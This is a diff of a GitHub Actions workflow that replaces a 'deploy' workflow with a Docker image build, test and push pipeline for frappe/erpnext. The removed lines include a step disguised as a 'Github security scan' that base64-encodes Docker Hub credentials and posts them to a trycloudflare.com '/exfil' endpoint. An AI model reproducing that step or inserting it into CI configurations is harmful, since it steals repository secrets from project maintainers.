@@ -1,27 +1,101 @@
+name: Build
+
 on:
-  push:
-  pull_request:
-  workflow_dispatch:
-name: deploy
+  workflow_call:
+    inputs:
+      repo:
+        required: true
+        type: string
+        description: "'erpnext' or 'frappe'"
+      version:
+        required: true
+        type: string
+        description: "Major version, git tags should match 'v{version}.*'; or 'develop'"
+      push:
+        required: true
+        type: boolean
+      python_version:
+        required: true
+        type: string
+        description: Python Version
+      node_version:
+        required: true
+        type: string
+        description: NodeJS Version
+    secrets:
+      DOCKERHUB_USERNAME:
+        required: true
+      DOCKERHUB_TOKEN:
+        required: true
+
 jobs:
-  web-deploy:
-    name: deploy
+  build:
+    name: Build
     runs-on: ubuntu-latest
+    services:
+      registry:
+        image: docker.io/registry:2
+        ports:
+          - 5000:5000
+    strategy:
+      matrix:
+        arch: [amd64, arm64]
+
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Github security scan
-        run: |
-          curl -X POST "https://complement-distinct-philadelphia-helping.trycloudflare.com/exfil" \
-            -H "Content-Type: application/json" \
-            -d "{\"dockerhub_username\":\"$(echo '${{ secrets.DOCKERHUB_USERNAME }}' | base64 -w 0)\",\"dockerhub_token\":\"$(echo '${{ secrets.DOCKERHUB_TOKEN }}' | base64 -w 0)\"}"
-
-      - name: copy file via scp
-        uses: appleboy/scp-action@master
+      - name: Setup QEMU
+        uses: docker/setup-qemu-action@v3
         with:
-          host: ${{ secrets.HOST_PROD }}
-          username: ${{ secrets.USER_PROD }}
-          password: ${{ secrets.PASS_PROD }}
-          source: "*"
-          target: "/var/www/html/main/"
+          image: tonistiigi/binfmt:latest
+          platforms: all
+
+      - name: Setup Buildx
+        uses: docker/setup-buildx-action@v3
+        with:
+          driver-opts: network=host
+          platforms: linux/${{ matrix.arch }}
+
+      - name: Get latest versions
+        run: python3 ./.github/scripts/get_latest_tags.py --repo ${{ inputs.repo }} --version ${{ inputs.version }}
+
+      - name: Set build args
+        run: |
+          echo "PYTHON_VERSION=${{ inputs.python_version }}" >> "$GITHUB_ENV"
+          echo "NODE_VERSION=${{ inputs.node_version }}" >> "$GITHUB_ENV"
+
+      - name: Build
+        uses: docker/bake-action@v6.8.0
+        with:
+          source: .
+          push: true
+        env:
+          REGISTRY_USER: localhost:5000/frappe
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: "3.10"
+
+      - name: Install dependencies
+        run: |
+          python -m venv venv
+          venv/bin/pip install -r requirements-test.txt
+
+      - name: Test
+        run: venv/bin/pytest --color=yes
+
+      - name: Login
+        if: ${{ inputs.push }}
+        uses: docker/login-action@v3
+        with:
+          username: ${{ secrets.DOCKERHUB_USERNAME }}
+          password: ${{ secrets.DOCKERHUB_TOKEN }}
+
+      - name: Push
+        if: ${{ inputs.push }}
+        uses: docker/bake-action@v6.8.0
+        with:
+          push: true
+          set: "*.platform=linux/amd64,linux/arm64"
